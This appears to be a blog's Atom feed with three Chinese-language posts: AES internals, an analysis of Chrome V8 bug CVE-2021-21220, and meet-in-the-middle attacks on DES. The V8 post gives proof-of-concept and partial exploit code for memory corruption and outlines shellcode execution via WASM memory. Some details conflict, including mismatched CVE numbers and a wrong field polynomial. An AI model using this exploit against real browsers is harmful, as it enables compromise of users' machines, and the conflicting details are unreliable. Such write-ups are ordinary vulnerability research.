<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Firework</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-05-16T17:26:43.288Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Firework</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AES分析</title>
    <link href="http://example.com/2021/05/17/cryp_AES/"/>
    <id>http://example.com/2021/05/17/cryp_AES/</id>
    <published>2021-05-16T17:19:14.434Z</published>
    <updated>2021-05-16T17:26:43.288Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Advanced Encryption Standard（AES），高级加密标准，是典型的块加密，被设计来取代 DES，由 Joan Daemen 和 Vincent Rijmen 所设计。其基本信息如下</p><ul><li>输入：128 比特。</li><li>输出：128 比特。</li><li>SPN 网络结构。</li><li>过程主要包括<strong>字节替代</strong>、<strong>行移位</strong>、<strong>列混淆</strong>和<strong>轮密钥加</strong></li></ul><p>其迭代轮数与密钥长度有关系，如下</p><div class="table-container"><table><thead><tr><th>密钥长度（比特）</th><th>迭代轮数</th></tr></thead><tbody><tr><td>128</td><td>10</td></tr><tr><td>192</td><td>12</td></tr><tr><td>256</td><td>14</td></tr></tbody></table></div><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在 AES 加解密过程中，每一块都是 128 比特，所以我们这里明确一些基本概念。</p><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_data_unit.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_data_unit.png" alt="img"></a></p><p>在 AES 中，块与 State 之间的转换过程如下</p><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_block2state.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_block2state.png" alt="img"></a></p><p>所以，可以看出，每一个 block 中的字节是按照列排列进入到状态数组的。</p><p>而对于明文来说，一般我们会选择使用其十六进制进行编码。</p><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_plain2state.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_plain2state.png" alt="img"></a></p><h3 id="加解密过程"><a href="#加解密过程" class="headerlink" title="加解密过程"></a>加解密过程</h3><p>这里给个看雪上比较好的 <a href="http://bbs.pediy.com/thread-90722.htm">图例</a> ，以便于介绍基本的流程，每一轮主要包括</p><ul><li>轮密钥加，AddRoundKey</li><li>字节替换，SubBytes</li><li>行移位，ShiftRows</li><li>列混淆，MixColumns</li></ul><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_details.jpg"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_details.jpg" alt="img"></a></p><p>上面的列混淆的矩阵乘法等号左边的列向量应该在右边。</p><p>这里再给一张其加解密的全图，其解密算法的正确性很显然。</p><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_enc_dec.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_enc_dec.png" alt="img"></a></p><p>我们这里重点关注一下以下。</p><h4 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h4><p>在字节替换的背后，其实是有对应的数学规则来定义对应的替换表的，如下</p><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_subbytes.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_subbytes.png" alt="img"></a></p><script type="math/tex; mode=display">这里的运算均定义GF(2^8)内</script><h4 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h4><script type="math/tex; mode=display">这里的运算也是定义在 GF(2^8) 上，使用的模多项式为 x^8+x^4+x^3+1。</script><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_key_expansion.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_key_expansion.png" alt="img"></a></p><h2 id="等价解密算法"><a href="#等价解密算法" class="headerlink" title="等价解密算法"></a>等价解密算法</h2><p>简单分析一下，我们可以发现</p><ul><li>交换逆向行移位和逆向字节代替并不影响结果。</li><li>交换轮密钥加和逆向列混淆并不影响结果，关键在于<ul><li>首先可以把异或看成域上的多项式加法</li><li>然后多项式中乘法对加法具有分配率。</li></ul></li></ul><h2 id="GF-2-8-上的四则运算"><a href="#GF-2-8-上的四则运算" class="headerlink" title="GF(2^8)上的四则运算"></a>GF(2^8)上的四则运算</h2><p>加减法：</p><script type="math/tex; mode=display">在GF(2^8)上的加法定义为二进制多项式加法，且其系数模2</script><p>Demo:  57+83=D4</p><script type="math/tex; mode=display">(x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+ x^4+ x^2 (mod m(x))</script><p>乘除法：</p><script type="math/tex; mode=display">在GF(2^8)中定义的二进制乘积模一个次数为8的不可约多项式</script><script type="math/tex; mode=display">m(x)= x^8+x^4+x^3+x+1</script><p>Demo: 57*83=C1</p><script type="math/tex; mode=display"> (x^6+x^4+x^2+x+1)·(x^7+x+1)=x^7+x^6+1(mod m(x))</script><p>列混合：</p><p>列混合操作等价于以下矩阵乘法：</p><p><img src="https://i.loli.net/2021/05/17/9h4RbYwG7LoDTvF.png" alt="AES.png"></p><script type="math/tex; mode=display">b3​x3+b2​x2+b1​x+b0​=(a3​x3+a2​x2+a1​x+a0​)({03}x3+{01}x2+{01}x+{02})</script><script type="math/tex; mode=display">=(a3​∗03)x6+(a3​∗01+a2​∗03)x5+(a3​∗01+a2​∗01+a1​∗03)x4+(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a2​∗02+a1​∗01+a0​∗01)x2+(a1​∗02+a0​∗01)x+a0​∗02</script><script type="math/tex; mode=display">=(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a3​∗03+a2​∗02+a1​∗01+a0​∗01)x2+(a3​∗01+a2​∗03+a1​∗02+a0​∗01)x+(a3​∗01+a2​∗01+a1​∗03+a0​∗02)</script><p>最终写为矩阵形式即如上图</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AES&quot;&gt;&lt;a href=&quot;#AES&quot; class=&quot;headerlink&quot; title=&quot;AES&quot;&gt;&lt;/a&gt;AES&lt;/h1&gt;&lt;h2 id=&quot;基本介绍&quot;&gt;&lt;a href=&quot;#基本介绍&quot; class=&quot;headerlink&quot; title=&quot;基本介绍&quot;&gt;&lt;/a&gt;基本介</summary>
      
    
    
    
    <category term="cryptography" scheme="http://example.com/categories/cryptography/"/>
    
    
    <category term="AES" scheme="http://example.com/tags/AES/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-25646堆溢出漏洞复现及分析</title>
    <link href="http://example.com/2021/05/08/CVE-2021-21220/"/>
    <id>http://example.com/2021/05/08/CVE-2021-21220/</id>
    <published>2021-05-08T06:57:36.610Z</published>
    <updated>2021-05-08T07:06:25.562Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-21220在野0day"><a href="#CVE-2021-21220在野0day" class="headerlink" title="CVE-2021-21220在野0day"></a>CVE-2021-21220在野0day</h1><h5 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h5><p>Google chrome 90.0.4430.72之前版本中存在安全漏洞，该漏洞源于V8优化中的数据验证不足。                 </p><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>chrome&lt; 90.0.4430.72以及Microsoft Edge和其他可能基于Chromium的浏览器。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="下载exp并利用"><a href="#下载exp并利用" class="headerlink" title="下载exp并利用"></a>下载exp并利用</h5><p><img src="https://i.loli.net/2021/05/08/DSlBGEj7zLPiK3a.png" alt="exp.jpg"></p><p>打开包含该漏洞的html页面，成功弹出计算器，执行恶意代码。</p><h4 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h4><h5 id="what’s-V8"><a href="#what’s-V8" class="headerlink" title="what’s V8"></a>what’s V8</h5><p>V8是Chromium内核中的JavaScript引擎，负责对JavaScript代码进行解释优化与执行，而CVE-2020-16040(crbug.com/1150649)是V8优化编译器Turbofan在SimplifiedLowering阶段产生的一个整数溢出漏洞。</p><h5 id="V8引擎工作流程"><a href="#V8引擎工作流程" class="headerlink" title="V8引擎工作流程"></a>V8引擎工作流程</h5><p><img src="https://i.loli.net/2021/05/08/uX2F8e39DnUAYIJ.png" alt="V8.png"></p><h5 id="Parser-解析器-："><a href="#Parser-解析器-：" class="headerlink" title="Parser(解析器)："></a><strong>Parser(解析器)：</strong></h5><p>负责通过对源代码进行词法分析得到的token对源代码进行语法错误分析、转换为AST抽象语法树并确定词法作用域：</p><p>Demo:</p><p><img src="https://i.loli.net/2021/05/08/mc7hrtTZsnzPMCD.png" alt="pz.jpg"></p><p><strong>Ignition(解释器)</strong>：负责将 AST 转换为中间代码即字节码(Bytecode)并逐行解释执行字节码，在该阶段， JavaScript 代码就已经开始执行了。</p><p>考虑如下代码bytecode.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line">ziwu_add(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>使用命令./d8 bytecode.js —allow-natives-syntax —print-bytecode —print-bytecode-filter ziwu_add可得到其字节码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[generated bytecode for function: ziwu_add (0x1984082d26e1 &lt;SharedFunctionInfo ziwu_add&gt;)]</span><br><span class="line">Parameter count 3</span><br><span class="line">Register count 0</span><br><span class="line">Frame size 0</span><br><span class="line">0x1984082d2826 @    0 : 25 04             Ldar a1</span><br><span class="line">0x1984082d2828 @    2 : 35 03 00          Add a0, [0]</span><br><span class="line">0x1984082d282b @    5 : ab                Return </span><br><span class="line">Constant pool (size &#x3D; 0)</span><br><span class="line">Handler Table (size &#x3D; 0)</span><br><span class="line">Source Position Table (size &#x3D; 0)</span><br></pre></td></tr></table></figure><p>Add a0, [0]即字节码，他告诉V8我们是要执行一个加法操作。</p><h5 id="TurboFan-优化编译器"><a href="#TurboFan-优化编译器" class="headerlink" title="TurboFan(优化编译器)"></a><strong>TurboFan(优化编译器)</strong></h5><p>负责将字节码和一些分析数据作为输入并生成优化的机器代码，当 Ignition 将 JavaScript 代码转换为字节码后，代码开始执行，V8 会一直观察 JavaScript  代码的执行情况，并记录执行信息，如每个函数的执行次数、每次调用函数时，传递的参数类型等。<strong>如果一个函数被调用的次数超过了内设的阈值，监视器就会将当前函数标记为热点函数（Hot Function）</strong>，并将该函数的字节码以及执行的相关信息发送给 TurboFan。TurboFan  会根据执行信息做出一些进一步优化此代码的假设，在假设的基础上将字节码编译为优化的机器代码。如果假设成立，那么当下一次调用该函数时，就会执行优化编译后的机器代码，以提高代码的执行性能。当某一次调用传入的信息变化时，表示 TurboFan 的假设是错误的，此时优化编译生成的机器代码就不能再使用了，于是进行优化回退，重走原复杂函数逻辑。</p><p><img src="https://i.loli.net/2021/05/08/542paODGEb1NAsl.png" alt="1.png"></p><p>优化Demo:</p><p>优化逻辑过程如下，考虑下述代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line">ziwu_add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">ziwu_add(<span class="string">&#x27;hack&#x27;</span>,<span class="string">&#x27;you&#x27;</span>);</span><br><span class="line">ziwu_add([],&#123;&#125;)</span><br></pre></td></tr></table></figure><p>V8在每次计算时需要先判断x、y的类型，然后执行相应的处理，但如果该函数要执行很多次呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ziwu_add = <span class="function">(<span class="params">x,y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++)&#123;</span><br><span class="line">  ziwu_add(<span class="number">1</span>+i,<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x参数持续变化，如果每次都要去判断类型是否过于繁琐，不够高效，Turbofan通过观察发现，经过了如此多的循环计算，x、y参数都是int类型，有理由相信下一次应该还是这样，那就不妨将x、y参数的类型假设为int，基于这个假设，我们可以将ziwu_add函数优化为简单的加法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add eax ebx;</span><br></pre></td></tr></table></figure><h5 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h5><p>根据补丁发生变化的位置分析：</p><p>漏洞存在于 Chrome 的 JS 引擎的 JIT 编译器 Turbofan 当中，Instruction Selector阶段在处理ChangeInt32ToInt64节点时，会先检查 node 的 input 节点，如果 input 节点的操作码是 Load，那么会根据该 input节点的 LoadRepresentation 和 MachineRepresentation进行一些特殊的处理，如果判断该 input 节点的 MachineRepresentation 的类型是kWord32, 那么会根据 LoadRepresentation 是有符号的还是无符号的选择对应的指令，如果是有符号的选择X64Movsxlq，在x86指令集中是有符号扩展，如果是无符号的选择X64Movl， 在x86指令集中是无符号扩展。</p><p><strong>漏洞的根源是V8 对ChangeInt32ToInt64的假设是该节点的输入必定被解释为一个有符号的Int32的值，所以无论 LoadRepresentation如何，都应该使用X64Movsxlq指令。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> InstructionSelector::<span class="function"><span class="title">VisitChangeInt32ToInt64</span>(<span class="params">Node* node</span>)</span> &#123;</span><br><span class="line">    DCHECK_EQ(node-&gt;InputCount(), <span class="number">1</span>);</span><br><span class="line">    Node* input = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;opcode() == IrOpcode::kTruncateInt64ToInt32) &#123;</span><br><span class="line">        node-&gt;ReplaceInput(<span class="number">0</span>, input-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    X64OperandGenerator g(<span class="built_in">this</span>);</span><br><span class="line">    Node* <span class="keyword">const</span> value = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (value-&gt;opcode() == IrOpcode::kLoad &amp;&amp; CanCover(node, value)) &#123;</span><br><span class="line">        LoadRepresentation load_rep = LoadRepresentationOf(value-&gt;op());</span><br><span class="line">        MachineRepresentation rep = load_rep.representation();</span><br><span class="line">        InstructionCode opcode;</span><br><span class="line">        <span class="keyword">switch</span> (rep) &#123;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kBit:<span class="comment">// Fall through.</span></span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord8:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord16:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MachineRepresentation::kWord32:</span><br><span class="line">            opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            UNREACHABLE();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>触发漏洞POC</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span> ** <span class="number">31</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo()); <span class="comment">//这一行输出-2147483647</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">foo();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;after optimization&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(foo());<span class="comment">//这一行输出2147483649</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样一个函数在优化前和优化后返回的结果不一致。在优化前，arr[0] ^ 0的结果用十六进制表示是0x80000000， 对于异或运算，JS 引擎会将结果看做一个有符号的 Int32 的值，所以异或的结果是-2147483648, 加上1 以后变成-2147483647。</p><p>但是为什么优化后的结果不一致了呢，我们可以观察程序运行过程中生成的 Turbofan 的图。arr[0] ^ 0这个表达式被优化成了一个Load节点， 对应下图中的 #81 节点，而(arr[0] ^0) + 1这个加法运算被优化成了#58 ChangeInt32ToInt64节点和#50 Int64Add节点，如下图中黄色高亮部分所示，在图中可以看到，Load 节点的 MachineRepresentation 是Word32，而LoadRepresentation的类型是Uint32， 故而 Turbofan 选择了movl指令，也就是无符号扩展指令，导致 Load 节点的值会被无符号扩展为 64 位，然后和 1 相加，最后结果自然是2147483649。</p><p><img src="https://i.loli.net/2021/05/08/ENX8fQpMLbOqrjK.png" alt="5.jpg"></p><p><img src="https://i.loli.net/2021/05/08/oWfOR7UkB2pcCPy.png" alt="2.png"></p><p>用调试器调试也可以验证，在执行到mov ecx, DWORD PTR [rcx] 这一行时，rcx寄存器指向的值为0x80000000, 无符号扩展变成了2147483648， 最后加上 1 变成了2147483649。</p><p><img src="https://i.loli.net/2021/05/08/3ItTaVXbodYwic2.png" alt="3.jpg"></p><h5 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params">size</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(size);</span><br><span class="line">            <span class="built_in">this</span>.slot = <span class="number">0xb33f</span>;<span class="comment">//进行地址泄露</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a) x = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>.sign(<span class="number">0</span> - <span class="built_in">Math</span>.max(<span class="number">0</span>, x, -<span class="number">1</span>)));<span class="comment">//构造长度为-1的数组</span></span><br><span class="line">        arr.shift();</span><br><span class="line">        <span class="keyword">let</span> local_arr = <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line">        local_arr[<span class="number">0</span>] = <span class="number">5.1</span>;<span class="comment">//4014666666666666</span></span><br><span class="line">        <span class="keyword">let</span> buff = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);<span class="comment">//</span></span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">0x1122</span>;<span class="comment">//修改数组长度</span></span><br><span class="line">        <span class="keyword">return</span> [arr, local_arr, buff];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">        foo(<span class="literal">false</span>);</span><br><span class="line">    gc(); gc();</span><br><span class="line">    [corrput_arr, rwarr, corrupt_buff] = foo(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>通过代码Array(Math.sign(0 – Math.max(0, x, -1)))创建一个length为-1的数组，然后使用LeakArrayBuffer构造内存布局，将相对读写布局成绝对读写。</p><p><img src="https://i.loli.net/2021/05/08/jQmvCbi89npDrFP.png" alt="4.png"></p><p>这里需要说明的是，由于chrome80以上版本启用了地址压缩，地址高4个字节，可以在构造的array后面的固定偏移找到。</p><p>先将corrupt_buffer的地址泄露，然后如下计算地址</p><blockquote><p>(corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</p></blockquote><p>可以计算出高4字节。</p><p>同时结合0x02步骤中实现的相对读写和对象泄露，可实现绝对地址读写。@r4j0x00在issue 1196683中构造length为-1数组后，则通过伪造对象实现任意地址读写。</p><p>之后，由于WASM内存具有RWX权限，因此可以将shellcode拷贝到WASM所在内存，实现任意代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2021-21220在野0day&quot;&gt;&lt;a href=&quot;#CVE-2021-21220在野0day&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-21220在野0day&quot;&gt;&lt;/a&gt;CVE-2021-21220在野0day&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="CVE" scheme="http://example.com/categories/CVE/"/>
    
    
    <category term="堆溢出" scheme="http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CVE-2021-21220" scheme="http://example.com/tags/CVE-2021-21220/"/>
    
  </entry>
  
  <entry>
    <title>中间相遇攻击分析</title>
    <link href="http://example.com/2021/05/08/cryp_%E4%B8%AD%E9%97%B4%E7%9B%B8%E9%81%87%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2021/05/08/cryp_%E4%B8%AD%E9%97%B4%E7%9B%B8%E9%81%87%E6%94%BB%E5%87%BB/</id>
    <published>2021-05-07T17:54:58.423Z</published>
    <updated>2021-05-16T17:25:36.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="中间相遇攻击-MITM"><a href="#中间相遇攻击-MITM" class="headerlink" title="中间相遇攻击 - MITM"></a>中间相遇攻击 - MITM</h1><h2 id="What’s-MITM"><a href="#What’s-MITM" class="headerlink" title="What’s MITM"></a>What’s MITM</h2><p>中间相遇攻击(Meet-in-the-middle attack):中间相遇攻击是一种以空间换取时间的一种攻击方法，1977 年由 Diffie 与 Hellman 提出。从个人角度看，这更多地指一种思想，不仅仅适用于密码学攻击，也适用于其他方面，可以降低算法的复杂度。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>假设 E 和 D 分别是加密函数和解密函数，k1 和 k2 分别是两次加密使用的密钥，则我们有：</p><script type="math/tex; mode=display">C=E_{k2}(E_{k1}(P))</script><script type="math/tex; mode=display">P=D_{k2}(D_{k1}(C))</script><p>则我们可以推出</p><script type="math/tex; mode=display">E_{k1}(P)=D_{k2}(C)</script><p>那么，当用户知道一对明文和密文时</p><ol><li>攻击者可以枚举所有的 k1，将 P 所有加密后的结果存储起来，并按照密文的大小进行排序。</li><li>攻击者进一步枚举所有的 k2，将密文 C 进行解密得到 C1，在第一步加密后的结果中搜索 C1，如果搜索到，则我们在一定程度上可以认为我们找到了正确的 k1 和 k2。</li><li>如果觉得第二步中得到的结果不保险，则我们还可以再找一些明密文对进行验证。</li></ol><p>下面以双重DES、三重DES为例进行中间相遇分析</p><h2 id="Double-DES-Analyse"><a href="#Double-DES-Analyse" class="headerlink" title="Double-DES_Analyse"></a>Double-DES_Analyse</h2><p>总密钥长度一共2×56位</p><p>穷举搜索复杂度：</p><script type="math/tex; mode=display">2^{112}</script><p>下面考虑中间相遇攻击复杂度分析：</p><p>对于给定明文P，密文C，密钥K1,K2：</p><script type="math/tex; mode=display">E_{k1}(P)=D_{k2}(C)=M</script><script type="math/tex; mode=display">首先P按照所有可能的k1进行加密得到M，可以得到2^{64}个结果，将结果按序存放一个表中</script><p>然后将C用所有可能的密钥K2解密，每解密一次，将解密结果与表中的值比较，如果由相等的，就将刚才测试的两个密钥对一个新的明密文对进行验证，若验证成功，则认定这两个密钥对是正确的密钥。</p><p>　结论：中间相遇攻击使用两组已知明密文对就可以猜出正确的密钥，其时间复杂度是2^56，比单重DES所需的2^55次方多不了多少。</p><h2 id="Treple-DES-Analyse"><a href="#Treple-DES-Analyse" class="headerlink" title="Treple-DES_Analyse"></a>Treple-DES_Analyse</h2><p><strong>3TDEA</strong></p><p>三密钥三重DES：</p><script type="math/tex; mode=display">C=E_{k3}(E_{k2}(E_{k1}(P)))</script><script type="math/tex; mode=display">P=D_{k3}(D_{k2}(D_{k1}(C)))</script><script type="math/tex; mode=display">穷举攻击复杂度:2^{56×3}</script><p>下面考虑中间相遇攻击：</p><script type="math/tex; mode=display">D_{k3}(C)=E_{k2}(E_{k1}(P))=M</script><p>同理：穷举k3解密C得到表项，穷举k1,k2解密P共2^{112}种可能</p><p>三密钥三重DES中间相遇攻击是有效的</p><p><strong>2TDEA</strong></p><p>双密钥三重DES：</p><script type="math/tex; mode=display">C=E_{k1}(D_{k2}(E_{k1}(P)))</script><script type="math/tex; mode=display">P=D_{k1}(E_{k2}(D_{k1}(C)))</script><script type="math/tex; mode=display">穷举攻击复杂度：2^{56×2}</script><p>下面考虑中间相遇攻击：</p><script type="math/tex; mode=display">D_{k1}(C)=D_{k2}(E_{k1}(P))=M</script><p>同理：穷举k1解密C得到表项，穷举k1,k2解密P共2^{112}种可能</p><p>与穷举攻击复杂度一样，因此对于双密钥三重DES，我们可以认为中间相遇攻击是无效的。</p><h2 id="CTF-对应题目"><a href="#CTF-对应题目" class="headerlink" title="CTF_对应题目"></a>CTF_对应题目</h2><ul><li>2018 国赛 Crackmec，参见 Wiki AES 部分</li><li>2018 Plaid CTF Transducipher，参见比特攻击部分的原理。</li><li>2018 国赛 Crackme java，参见 Wiki 整数域上的离散对数部分</li><li>2018 WCTF RSA，参见 wiki RSA Complex 部分</li></ul>]]></content>
    
    
      
      
